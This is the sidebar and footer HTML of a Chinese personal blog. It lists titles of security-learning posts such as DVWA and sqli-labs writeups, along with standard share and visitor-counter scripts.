href="/2020/06/29/Web%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web系统漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web应用漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E3%80%81%E5%8D%B1%E5%AE%B3%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%A6%82%E8%BF%B0/">Web中间件漏洞基本原理、危害及修复概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/">DVWA关卡纪录</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/sqli-labs-writeup/">sqli-labs-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/28/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%83%A8%E5%88%86writeup/">实验室考核部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/16/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E8%AE%BE-%E5%9F%BA%E4%BA%8Ephp%E4%B8%8Ehtml%E7%9A%84cpu%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/">网络操作系统课设--基于php与html的cpu调度算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/ubuntu16-04-%E6%90%AD%E5%BB%BAemail%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建email服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/16/ISCC2019%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">ISCC2019部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/ubuntu16-04-%E6%90%AD%E5%BB%BAftp%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建ftp服务器</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Subject/" style="font-size: 15px;">Subject</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">web安全</a> <a href="/tags/start/" style="font-size: 15px;">start</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">10</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="https://nikoeurus.github.io/" title="Somnus's blog" target="_blank">Somnus's blog</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">网站地图</a> |  <a href="/atom.xml">订阅本站</a> |  <a href="/about/">联系博主</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">fzykn06.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.4"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.4" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","weixin","tsina","qzone","linkedin","fbook","twi","print","renren","sqq","evernotecn","bdysc","tqq","tqf","bdxc","kaixin001","tieba","douban","bdhome","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","h163","copy"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"]}};with(document)0[(getElementsByTagName('head')[0]||head).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script><script>var jiathis_config={
    data_track_clickback:true,
    summary:"",
    shortUrl:true,
    hideMore:false
}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script></body></html>